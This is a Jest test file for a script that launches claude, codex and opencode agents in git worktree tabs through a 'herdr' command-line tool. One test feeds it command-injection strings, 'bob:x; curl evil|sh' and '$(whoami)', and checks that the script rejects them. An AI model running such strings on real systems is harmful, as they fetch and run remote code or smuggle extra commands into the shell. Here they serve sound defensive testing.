const { parseArgs, makeAgent, launchAgent, up } = require('../skills/herdr/scripts/up.js');

describe('makeAgent', () => {
  test('claude → ◆ glyph, ["claude"] argv', () => {
    expect(makeAgent('claude', 'sly'))
      .toEqual({ model: 'claude', handle: 'sly', runArgv: ['claude'], glyph: '◆' });
  });
  test('codex → ◇ glyph, ["codex"] argv', () => {
    expect(makeAgent('codex', 'jay'))
      .toEqual({ model: 'codex', handle: 'jay', runArgv: ['codex'], glyph: '◇' });
  });
  test('opencode splits handle:model into an argv vector (model may contain colons)', () => {
    expect(makeAgent('opencode', 'bob:ollama/qwen2.5:7b')).toEqual({
      model: 'opencode', handle: 'bob',
      runArgv: ['opencode', '-m', 'ollama/qwen2.5:7b'], glyph: '⬨',
    });
  });
  test('opencode without :model throws', () => {
    expect(() => makeAgent('opencode', 'bob')).toThrow(/<handle>:<model>/);
  });
  test('opencode model with shell metacharacters is rejected', () => {
    expect(() => makeAgent('opencode', 'bob:x; curl evil|sh')).toThrow(/unsafe characters/);
    expect(() => makeAgent('opencode', 'bob:$(whoami)')).toThrow(/unsafe characters/);
    // a legitimate model with dots, slashes and a colon is still accepted
    expect(makeAgent('opencode', 'bob:ollama/qwen2.5:7b').runArgv).toEqual(['opencode', '-m', 'ollama/qwen2.5:7b']);
  });
});

describe('parseArgs', () => {
  test('collects agents in flag order with defaults', () => {
    const cfg = parseArgs(['--branch', 'chore/x', '--claude', 'sly', '--codex', 'jay']);
    expect(cfg.branch).toBe('chore/x');
    expect(cfg.base).toBe('origin/main');
    expect(cfg.timeout).toBe(45000);
    expect(cfg.agents.map((a) => a.handle)).toEqual(['sly', 'jay']);
  });
  test('--base and --timeout override defaults', () => {
    const cfg = parseArgs(['--branch', 'b', '--base', 'origin/dev', '--timeout', '9000', '--claude', 'sly']);
    expect(cfg.base).toBe('origin/dev');
    expect(cfg.timeout).toBe(9000);
  });
  test('missing --branch throws', () => {
    expect(() => parseArgs(['--claude', 'sly'])).toThrow(/--branch is required/);
  });
  test('zero agent flags throws', () => {
    expect(() => parseArgs(['--branch', 'b'])).toThrow(/at least one agent/);
  });
  test('duplicate handle throws', () => {
    expect(() => parseArgs(['--branch', 'b', '--claude', 'sly', '--codex', 'sly']))
      .toThrow(/duplicate handle/);
  });
  test('unknown flag throws', () => {
    expect(() => parseArgs(['--branch', 'b', '--bogus', 'x'])).toThrow(/unknown flag/);
  });
  test('flag missing its value throws', () => {
    expect(() => parseArgs(['--branch'])).toThrow(/missing value for --branch/);
  });
});

// Responses may be strings or (file, args) => string functions.
function fakeRunner(matchers) {
  const calls = [];
  const run = (file, args) => {
    calls.push([file, ...args]);
    for (const [pred, resp] of matchers) {
      if (pred(file, args)) {
        if (resp instanceof Error) throw resp;
        return typeof resp === 'function' ? resp(file, args) : resp;
      }
    }
    return '';
  };
  return { run, calls };
}

const AGENT_LIST = (names = []) =>
  JSON.stringify({ result: { agents: names.map((name) => ({ name })) } });
const WT = JSON.stringify({
  result: {
    worktree: { path: '/wt/x', open_workspace_id: 'wR' },
    root_pane: { pane_id: 'wR:p1' },
    tab: { tab_id: 'wR:t1' },
  },
});

// Dynamic tab/pane ids so multi-agent sequences stay distinguishable:
// tab create -> t2/p2, t3/p4, ...; agent start -> p3, p5, ...
function dynMatchers(listResp = AGENT_LIST()) {
  let t = 1;
  let p = 1;
  return [
    [(f, a) => f === 'herdr' && a[0] === 'agent' && a[1] === 'list', listResp],
    [(f, a) => f === 'herdr' && a[0] === 'worktree' && a[1] === 'create', WT],
    [(f, a) => f === 'herdr' && a[0] === 'tab' && a[1] === 'create',
      () => JSON.stringify({ result: { tab: { tab_id: `wR:t${++t}` }, root_pane: { pane_id: `wR:p${++p}` } } })],
    [(f, a) => f === 'herdr' && a[0] === 'agent' && a[1] === 'start',
      (f, a) => JSON.stringify({ result: { agent: { pane_id: `wR:p${++p}`, name: a[2] } } })],
  ];
}

describe('launchAgent', () => {
  test('tab create -> agent start --tab (named at start) -> close root -> wait idle', () => {
    const { run, calls } = fakeRunner(dynMatchers());
    const out = launchAgent(makeAgent('codex', 'jay'), { workspace: 'wR', cwd: '/wt/x' }, { run });
    expect(out).toEqual({ handle: 'jay', model: 'codex', pane_id: 'wR:p3', tab: 'wR:t2' });
    expect(calls).toEqual([
      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'jay ◇', '--no-focus'],
      ['herdr', 'agent', 'start', 'jay', '--tab', 'wR:t2', '--cwd', '/wt/x', '--no-focus', '--', 'codex'],
      ['herdr', 'pane', 'close', 'wR:p2'],
      ['herdr', 'agent', 'wait', 'jay', '--status', 'idle', '--timeout', '45000'],
    ]);
  });
  test('label and timeout are overridable', () => {
    const { run, calls } = fakeRunner(dynMatchers());
    launchAgent(makeAgent('claude', 'sly'), { workspace: 'wR', cwd: '/wt/x', label: 'x', timeout: 9000 }, { run });
    expect(calls).toContainEqual(
      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'x', '--no-focus']);
    expect(calls).toContainEqual(['herdr', 'agent', 'wait', 'sly', '--status', 'idle', '--timeout', '9000']);
  });
});

describe('up', () => {
  test('single claude agent: exact call sequence and result', () => {
    const { run, calls } = fakeRunner(dynMatchers());
    const result = up(['--branch', 'chore/x', '--claude', 'sly'], { run });

    expect(result).toEqual({
      worktree: { path: '/wt/x', workspace_id: 'wR' },
      agents: [{ handle: 'sly', model: 'claude', pane_id: 'wR:p3', tab: 'wR:t2' }],
    });
    expect(calls).toEqual([
      ['herdr', 'agent', 'list'],
      ['git', 'fetch', 'origin', 'main'],
      ['herdr', 'worktree', 'create', '--branch', 'chore/x', '--base', 'origin/main', '--no-focus', '--json'],
      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'sly ◆', '--no-focus'],
      ['herdr', 'agent', 'start', 'sly', '--tab', 'wR:t2', '--cwd', '/wt/x', '--no-focus', '--', 'claude'],
      ['herdr', 'pane', 'close', 'wR:p2'],
      ['herdr', 'agent', 'wait', 'sly', '--status', 'idle', '--timeout', '45000'],
      ['herdr', 'tab', 'close', 'wR:t1'], // the worktree's original root tab
    ]);
  });

  test('each agent gets its own tab; the worktree root tab closes last', () => {
    const { run, calls } = fakeRunner(dynMatchers());
    const result = up(['--branch', 'chore/x', '--claude', 'sly', '--codex', 'jay'], { run });

    expect(result.agents).toEqual([
      { handle: 'sly', model: 'claude', pane_id: 'wR:p3', tab: 'wR:t2' },
      { handle: 'jay', model: 'codex', pane_id: 'wR:p5', tab: 'wR:t3' },
    ]);
    expect(calls).toContainEqual(
      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'jay ◇', '--no-focus']);
    expect(calls).toContainEqual(
      ['herdr', 'agent', 'start', 'jay', '--tab', 'wR:t3', '--cwd', '/wt/x', '--no-focus', '--', 'codex']);
    expect(calls[calls.length - 1]).toEqual(['herdr', 'tab', 'close', 'wR:t1']);
  });

  test('opencode agent starts with the argv vector', () => {
    const { run, calls } = fakeRunner(dynMatchers());
    up(['--branch', 'b', '--opencode', 'bob:ollama/qwen2.5:7b'], { run });
    expect(calls).toContainEqual(
      ['herdr', 'agent', 'start', 'bob', '--tab', 'wR:t2', '--cwd', '/wt/x', '--no-focus',
        '--', 'opencode', '-m', 'ollama/qwen2.5:7b']);
  });

  test('git fetch derives the branch from --base', () => {
    const { run, calls } = fakeRunner(dynMatchers());
    up(['--branch', 'b', '--base', 'origin/dev', '--claude', 'sly'], { run });
    expect(calls).toContainEqual(['git', 'fetch', 'origin', 'dev']);
  });

  test('--timeout flows into the readiness wait', () => {
    const { run, calls } = fakeRunner(dynMatchers());
    up(['--branch', 'b', '--timeout', '9000', '--claude', 'sly'], { run });
    expect(calls).toContainEqual(['herdr', 'agent', 'wait', 'sly', '--status', 'idle', '--timeout', '9000']);
  });

  test('pre-flight rejects a globally taken handle without creating a worktree', () => {
    const { run, calls } = fakeRunner(dynMatchers(AGENT_LIST(['sly'])));
    expect(() => up(['--branch', 'b', '--claude', 'sly'], { run })).toThrow(/already taken: sly/);
    expect(calls.some((c) => c[1] === 'worktree' && c[2] === 'create')).toBe(false);
  });

  test('propagates a runner failure', () => {
    const failing = [
      [(f, a) => f === 'herdr' && a[0] === 'agent' && a[1] === 'list', AGENT_LIST()],
      [(f, a) => f === 'herdr' && a[0] === 'worktree' && a[1] === 'create', new Error('worktree_create_failed')],
    ];
    const { run } = fakeRunner(failing);
    expect(() => up(['--branch', 'b', '--claude', 'sly'], { run })).toThrow(/worktree_create_failed/);
  });
});

const { execFileSync } = require('child_process');
const path = require('path');

const HERD = path.join(__dirname, '..', 'skills', 'herdr', 'scripts', 'herd.js');
const UP = path.join(__dirname, '..', 'skills', 'herdr', 'scripts', 'up.js');

describe('herd.js up wiring', () => {
  test('helper scripts parse under the active Node runtime', () => {
    execFileSync('node', ['--check', HERD], { encoding: 'utf8', stdio: 'pipe' });
    execFileSync('node', ['--check', UP], { encoding: 'utf8', stdio: 'pipe' });
  });

  test('node herd.js up with no flags errors on stderr and exits non-zero', () => {
    let err;
    try {
      execFileSync('node', [HERD, 'up'], { encoding: 'utf8', stdio: 'pipe' });
    } catch (e) {
      err = e;
    }
    expect(err).toBeDefined();
    expect(err.status).toBe(1);
    expect(String(err.stderr)).toMatch(/herd up: --branch is required/);
  });
});
